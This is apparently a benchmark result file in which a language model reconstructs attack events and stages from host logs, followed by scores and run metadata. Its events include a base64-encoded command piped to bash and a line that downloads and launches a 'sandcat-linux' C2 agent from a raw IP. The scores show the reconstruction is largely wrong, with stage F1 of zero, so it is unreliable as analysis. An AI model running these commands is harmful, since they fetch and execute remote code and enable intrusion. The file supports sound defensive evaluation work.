@@ -1,0 +1,82 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash -c echo start:454b7093-cc6e-484e-9c42-e222c6906204",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c /usr/local/hostguard/bin/curl -k --connect-timeout 10 \"https://100.125.1.29:443/hostmgr/version?agentid=cfcbd32f-135a-494d-8884-f7ede71df66e&ts=1648192557&mode=100\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c curl -O  http://124.223.85.207:8079/sandcat-linux ; chmod +x sandcat-linux ;nohup ./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v > /dev/null 2>&1 &",
+        "stage": "Execution"
+      },
+      {
+        "command": "ssh -D -R",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "bash -c echo start:b3033461-3342-4b36-87af-780ffe63cd09",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo start:e147423c-b478-4291-8866-115c380e19a0",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "bash -c echo start:3d4c5b71-9d0b-427b-9ddf-5bb208e30119",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attacker appears to have gained initial access through an SSH tunnel using an unknown SSH client. The ssh-client connects to a remote host at `100.125.1.29`. This suggests that the attacker has already compromised another system, possibly as part of a larger campaign, allowing them to use it as a pivot point for further attacks. After establishing a connection, they execute multiple commands to install additional tools such as `sandcat` executable, demonstrating their intent to maintain persistence on the target system. They also create web servers on ports 8080 and 8079, likely used for communication with other compromised systems or command and control operations.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19748,
+      "completion_tokens": 572,
+      "total_tokens": 20320,
+      "wall_clock_s": 9.291,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.25,
+      "recall": 0.2857142857142857,
+      "f1": 0.26666666666666666,
+      "tp": 2,
+      "fp": 6,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 8,
+      "fn": 7,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 19748,
+      "completion_tokens": 572,
+      "total_tokens": 20320,
+      "wall_clock_s": 9.291,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
